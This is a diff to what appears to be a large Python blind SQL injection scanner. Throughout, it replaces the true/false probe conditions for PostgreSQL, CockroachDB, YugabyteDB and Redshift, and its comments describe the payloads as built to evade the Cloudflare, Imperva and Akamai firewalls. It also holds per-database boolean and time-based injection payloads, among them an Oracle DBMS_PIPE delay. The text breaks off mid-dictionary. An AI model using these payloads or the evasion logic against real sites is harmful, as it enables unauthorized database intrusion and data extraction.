@@ -39363,10 +39363,10 @@ async def detect_boolean(engine,config,method,url,data,data_fmt,
                 # Order matters: more-specific patterns first
             _flip_pairs = [
                     # WAF-evasive tautology  contradiction pairs (most specific)
-                ("ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                 "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)"),
-                ("ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                 "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)"),
+                ("ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                 "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)"),
+                ("ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                 "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)"),
                 ("LEAST(2e0,3e0)>(0e0)",    "GREATEST(2e0,3e0)<(0e0)"),
                 ("GREATEST(2e0,3e0)<(0e0)", "LEAST(2e0,3e0)>(0e0)"),
                 ("ABS(-1e0)>(0e0)",         "ABS(-1e0)<(0e0)"),
@@ -43232,10 +43232,10 @@ async def _extract_int(engine,config,queries,int_func,result,method,url,
                 
                 # TRUE probe: condition that always evaluates true (WAF-evasive, no 1=1/1=2)
                 _ei_calib_true_inner = {
-                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
                     "MySQL":           "LEAST(2e0,3e0)>(0e0)",
                     "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
                     "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -43251,10 +43251,10 @@ async def _extract_int(engine,config,queries,int_func,result,method,url,
                     "SAP_HANA":        "ABS(-1e0)>(0e0)",
                 }.get(_ifunc_dbms_ei, "1e0<2e0")
                 _ei_calib_false_inner = {
-                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
                     "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
                     "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
                     "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
@@ -43905,8 +43905,8 @@ def build_extraction_payload_from_confirmed(
                 new_expression + (_cp.group(3) or '') +
                 _body[_cp.end():] + _sfx)
 
-    # CASE WHEN condition replacement: handles ARRAY_LOWER(...)!~~LN(2.718),
-    # ARRAY_LOWER(...)~~LN(2.718), and any other complex WHEN conditions that
+    # CASE WHEN condition replacement: handles ARRAY_LOWER(...)>(0e0),
+    # ARRAY_LOWER(...)<(0e0), and any other complex WHEN conditions that
     # the _cp regex cannot match (e.g. NOT ILIKE / ILIKE operators).
     # Flexible regex: allows 0+ inline SQL comments (each /*...*/ optionally followed
     # by whitespace) between CASE and WHEN, and between WHEN and the condition.
@@ -48051,10 +48051,10 @@ class Enumerator:
                     # of cache/rate-limit jitter even when the oracle is valid.
                     _san_dbms = getattr(self, 'dbms', '') or ''
                     _san_true_cond = {
-                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
                         "MySQL":           "LEAST(2e0,3e0)>(0e0)",
                         "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
                         "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -48070,10 +48070,10 @@ class Enumerator:
                         "SAP_HANA":        "ABS(-1e0)>(0e0)",
                     }.get(_san_dbms, "1e0<2e0")
                     _san_false_cond = {
-                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
                         "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
                         "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
                         "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
@@ -48412,10 +48412,10 @@ class Enumerator:
                 # _timing_eval_fn_tf closure generates a new random nonce per call).
                 # This avoids discarding a valid oracle because of CDN cache warm-up.
                 _tf_eval_true_cond = {
-                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
                     "MySQL":           "LEAST(2e0,3e0)>(0e0)",
                     "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
                     "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -48431,10 +48431,10 @@ class Enumerator:
                     "SAP_HANA":        "ABS(-1e0)>(0e0)",
                 }.get(_dbms_tf, "1e0<2e0")
                 _tf_eval_false_cond = {
-                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
                     "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
                     "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
                     "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
@@ -54361,10 +54361,10 @@ class Scanner:
         # DBMS and evaluates to TRUE or FALSE without using banned constant-comparison
         # patterns that Cloudflare/Imperva/Akamai block unconditionally.
         _cal_true_cond = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
             "MySQL":           "LEAST(2e0,3e0)>(0e0)",
             "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
             "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -54380,10 +54380,10 @@ class Scanner:
             "SAP_HANA":        "ABS(-1e0)>(0e0)",
         }.get(_dbms, "1e0<2e0")
         _cal_false_cond = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
             "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
             "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
             "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
@@ -55799,10 +55799,10 @@ class Scanner:
             # WAF-blocked response → EMD≈0 → threshold (0.25) not reached → oracle skipped.
             # Use the same DBMS-native evasive conditions as the baseline-similarity oracle.
             _wass_true_cond = {
-                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
                 "MySQL":           "LEAST(2e0,3e0)>(0e0)",
                 "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
                 "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -55818,10 +55818,10 @@ class Scanner:
                 "SAP_HANA":        "ABS(-1e0)>(0e0)",
             }.get(_dbms or "", "1e0<2e0")
             _wass_false_cond = {
-                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
                 "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
                 "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
                 "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
@@ -56353,8 +56353,8 @@ class Scanner:
                             _floor_ck = _dbms == 'ClickHouse'
                             _fv = 2 + _rcal  # vary per round to bust dedup cache
                             if _floor_pg:
-                                _true_cond  = f"ARRAY_LOWER(ARRAY[1e0,{_fv}e0,3e0],1e0)!~~LN(2.718)"
-                                _false_cond = f"ARRAY_LOWER(ARRAY[1e0,{_fv}e0,3e0],1e0)~~LN(2.718)"
+                                _true_cond  = f"ARRAY_LOWER(ARRAY[1e0,{_fv}e0,3e0],1e0)>(0e0)"
+                                _false_cond = f"ARRAY_LOWER(ARRAY[1e0,{_fv}e0,3e0],1e0)<(0e0)"
                             elif _floor_my:
                                 _true_cond  = f"LEAST({_fv}e0,3e0)>(0e0)"
                                 _false_cond = f"GREATEST({_fv}e0,3e0)<(0e0)"
@@ -56532,10 +56532,10 @@ class Scanner:
                                     # to True/False but don't match WAF injection-fingerprint rule sets.
                                     _bsl_dbms = _dbms or ""
                                     _bsl_true_cond = {
-                                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
                                         "MySQL":           "LEAST(2e0,3e0)>(0e0)",
                                         "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
                                         "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -56551,10 +56551,10 @@ class Scanner:
                                         "SAP_HANA":        "ABS(-1e0)>(0e0)",
                                     }.get(_bsl_dbms, "1e0<2e0")
                                     _bsl_false_cond = {
-                                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
                                         "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
                                         "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
                                         "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
@@ -59865,10 +59865,10 @@ class Scanner:
             if not _oracle_fragile:
                 try:
                     _defer_san_true_cond = {
-                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
                         "MySQL":           "LEAST(2e0,3e0)>(0e0)",
                         "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
                         "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -59884,10 +59884,10 @@ class Scanner:
                         "SAP_HANA":        "ABS(-1e0)>(0e0)",
                     }.get(_dbms, "1e0<2e0")
                     _defer_san_false_cond = {
-                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                        "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                        "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                        "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                        "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
                         "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
                         "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
                         "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
@@ -62414,10 +62414,10 @@ class Scanner:
                             getattr(cfg, 'dbms', None) or
                             getattr(cfg, '_detected_dbms', None) or '') or ''
         _direct_cal_true = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
             "MySQL":           "LEAST(2e0,3e0)>(0e0)",
             "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
             "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -62433,10 +62433,10 @@ class Scanner:
             "SAP_HANA":        "ABS(-1e0)>(0e0)",
         }.get(_direct_cal_dbms, "1e0<2e0")
         _direct_cal_false = {
-            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
             "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
             "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
             "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
@@ -97300,10 +97300,10 @@ class ScannerV11(ScannerV10):
                                 return 0.0
                             return (time.monotonic() - t0) * 1000
                         _v11_cal_true = {
-                            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
                             "MySQL":           "LEAST(2e0,3e0)>(0e0)",
                             "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
                             "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -97319,10 +97319,10 @@ class ScannerV11(ScannerV10):
                             "SAP_HANA":        "ABS(-1e0)>(0e0)",
                         }.get(_dbms11, "1e0<2e0")
                         _v11_cal_false = {
-                            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-                            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+                            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
                             "MySQL":           "GREATEST(2e0,3e0)<(0e0)",
                             "MariaDB":         "GREATEST(2e0,3e0)<(0e0)",
                             "TiDB":            "GREATEST(2e0,3e0)<(0e0)",
@@ -119487,10 +119487,10 @@ class TechniqueCascadeEngine:
             ("DBMS_PIPE.RECEIVE_MESSAGE('sqrdc3',3),0)>=0", "DBMS_PIPE.RECEIVE_MESSAGE('sqrdc3',0),0)>=0"),
             # ── Most specific patterns first (order matters) ──────────────────
             # WAF-evasive tautology  contradiction pairs
-            ("ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-             "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)"),
-            ("ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
-             "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)"),
+            ("ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+             "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)"),
+            ("ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)<(0e0)",
+             "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)"),
             ("LEAST(2e0,3e0)>(0e0)",    "GREATEST(2e0,3e0)<(0e0)"),
             ("GREATEST(2e0,3e0)<(0e0)", "LEAST(2e0,3e0)>(0e0)"),
             ("ABS(-1e0)>(0e0)",         "ABS(-1e0)<(0e0)"),
@@ -121258,10 +121258,10 @@ class UniversalScanOrchestrator:
                                                                  getattr(_scanner_ref.config, 'dbms', '') or
                                                                  'PostgreSQL')
                                                 _ibo_pol_true = {
-                                                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                                                    "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                                                    "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                                                    "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                                                    "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
                                                     "MySQL":           "LEAST(2e0,3e0)>(0e0)",
                                                     "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
                                                     "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -122215,10 +122215,10 @@ class UniversalScanOrchestrator:
                                                                         getattr(_scanner_ref.config, 'dbms', '') or
                                                                         'PostgreSQL')
                                                         _wb_cal_true = {
-                                                            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                                            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                                            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
-                                                            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)",
+                                                            "PostgreSQL":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                                                            "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                                                            "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
+                                                            "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)>(0e0)",
                                                             "MySQL":           "LEAST(2e0,3e0)>(0e0)",
                                                             "MariaDB":         "LEAST(2e0,3e0)>(0e0)",
                                                             "TiDB":            "LEAST(2e0,3e0)>(0e0)",
@@ -122228,10 +122228,10 @@ class UniversalScanOrchestrator:
                                                             "SQLite":          "MIN(2e0,3e0)>(0e0)",
                                                         }.get(_wb_cal_dbms, "1e0<2e0")
                                                         _wb_cal_false = {
